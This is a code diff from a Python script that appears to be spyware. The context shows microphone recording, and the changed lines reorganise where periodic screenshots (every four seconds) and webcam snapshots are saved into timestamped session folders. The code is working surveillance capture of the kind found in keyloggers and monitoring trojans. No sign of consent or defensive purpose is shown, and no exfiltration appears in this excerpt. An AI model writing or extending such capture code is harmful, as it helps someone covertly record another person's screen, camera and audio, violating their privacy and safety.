@@ -103,22 +103,31 @@ def microphone():
     write(file_path + audio_info, fs, myrecording)
 
 # Define separate folders for screenshots and webcam images
-screenshots_folder = os.path.join(file_path, "screenshots")  # Folder for screenshots
-webcam_folder = os.path.join(file_path, "webcam_images")  # Folder for webcam images
+currtime = datetime.now().strftime("%Y%m%d%H%M%S")
+# sessions_folder=os.path.join(file_path,f"/sessions/session{currtime}")
+# webcam_folder = os.path.join(file_path, f"{sessions_folder}/webcam_images")  # Folder for webcam images
+# screenshots_folder = os.path.join(file_path, f"{sessions_folder}/screenshots")  # Folder for screenshots
+
+sessions_folder = os.path.join(file_path, f"sessions", f"session{currtime}")
+webcam_folder = os.path.join(sessions_folder, "webcam_images")  # Folder for webcam images
+screenshots_folder = os.path.join(sessions_folder, "screenshots")
+
+
 
 # Create the folders if they don't exist
+if not os.path.exists(sessions_folder):
+    os.makedirs(sessions_folder)
 if not os.path.exists(screenshots_folder):
     os.makedirs(screenshots_folder)
-
 if not os.path.exists(webcam_folder):
     os.makedirs(webcam_folder)
 
 # Screenshot Capture
 def screenshots():
     timestamp = datetime.now().strftime("%Y%m%d%H%M%S")  # Generate a unique timestamp
-    screenshot_file =  f"/screenshots/screenshot_{timestamp}.png"  # Save in the 'screenshots' folder
+    screenshot_file =  f"{screenshots_folder}/screenshot_{timestamp}.png"  # Save in the 'screenshots' folder
     im = ImageGrab.grab()
-    im.save(file_path + screenshot_file)
+    im.save(screenshot_file)
 
 schedule.every(4).seconds.do(screenshots)
 
@@ -127,9 +136,9 @@ def webcam_capture():
     cam = VideoCapture(0)
     result, image = cam.read()
     timestamp = datetime.now().strftime("%Y%m%d%H%M%S")  # Generate a unique timestamp
-    webcam_shot_file =  f"/webcam_images/webcam_{timestamp}.png" # Save in the 'webcam_images' folder
+    webcam_shot_file =  f"{webcam_folder}/webcam_{timestamp}.png" # Save in the 'webcam_images' folder
     if result:
-        imwrite(file_path + webcam_shot_file, image)
+        imwrite(webcam_shot_file, image)
     cam.release()
     # destroyWindow("webCam")
 
